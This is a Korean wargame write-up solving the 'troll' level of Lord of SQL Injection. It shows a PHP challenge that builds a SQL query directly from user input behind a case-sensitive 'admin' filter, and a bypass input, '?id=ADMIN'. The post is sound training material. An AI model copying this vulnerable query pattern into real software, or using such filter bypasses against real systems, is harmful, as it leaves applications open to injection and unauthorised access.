---
title: "[Lord of SQL Injection] LoS - troll 문제풀이"
date: 2018-07-27
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제의 이름은 `troll`이다.
중간중간에 좀 쉬운 문제들이 있어서 하루에 여러개 빠박! 풀고 싶은데 그러면 내가 일을 안할 것 같으니 한문제 씩만 풀어야겠다.
이번 문제는 매우 간단하다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------
query : select id from prob_troll where id=''
----------------------------------------------------------

<?php  
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(@ereg("admin",$_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

쿼리를 완성시켜 `id`가 `admin`인 결과를 가져오면 된다.
그런데 코드 중간을 보면 `ereg("admin", %_GET['id'])`라는 부분이 있다.
`ereg()` 함수는 정규표현식을 이용해서 일치하는 문자열이 있는지를 찾아주는 함수이다.
이 문제에서는 사용자가 입력 한 `id`에  `admin`이라는 문자열이 있는지 없는지를 검사한다.
문제를 풀려면 `id`가 `admin`인 결과를 추출해야 하는데 `admin`에 필터링이 걸려있다.
그래서 `ereg()` 함수에 오류가 있거나 필터링이 완벽하지 않을 것이라고 생각하고 문제에 접근했다.

이 전에도 몇번 언급했다시피 `MySQL`에서는 대소문자 구분이 없다.
때문에 `id`가 `admin`인 결과를 추출하기 위해서 쿼리의 `where`절에 `admin`, `Admin`, `ADMIN` 등을 입력해도 결국 같은 값을 얻을 수 있다.
찾아보니 `ereg()` 함수는 대소문자를 구분하는 함수이다.
그래서 `admin`이라는 단어가 있다면 `true`를 반환하겠지만 `Admin`, `ADMIN` 처럼 한 글자라도 대문자로 구성한다면 `false`를 반환 할 것이다.
그렇다면 필터링도 우회하고 쿼리도 정상적으로 실행 해 문제를 풀 수 있다.
역시나 아래와 같이 입력했더니 문제를 풀 수 있었다.  

```plain
?id=ADMIN
```

---

```php
-------------------------------------------------------------------
query : select id from prob_troll where id='ADMIN'
-------------------------------------------------------------------

TROLL Clear!
<?php  
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(@ereg("admin",$_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

---

```plain
TROLL Clear!!`
```